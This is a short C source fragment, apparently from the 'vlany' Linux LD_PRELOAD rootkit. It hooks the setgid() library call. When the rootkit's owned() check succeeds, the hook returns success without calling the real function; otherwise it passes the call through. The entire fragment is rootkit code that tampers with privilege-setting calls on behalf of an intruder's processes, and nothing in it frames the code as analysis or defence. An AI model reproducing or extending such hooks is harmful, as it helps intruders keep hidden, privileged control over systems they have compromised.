int setgid(gid_t gid)
{
    #ifdef DEBUG
        printf("[vlany] setgid() called\n");
    #endif

    HOOK(old_setgid, CSETGID);

    if(owned()) return 0;

    return old_setgid(gid);
}
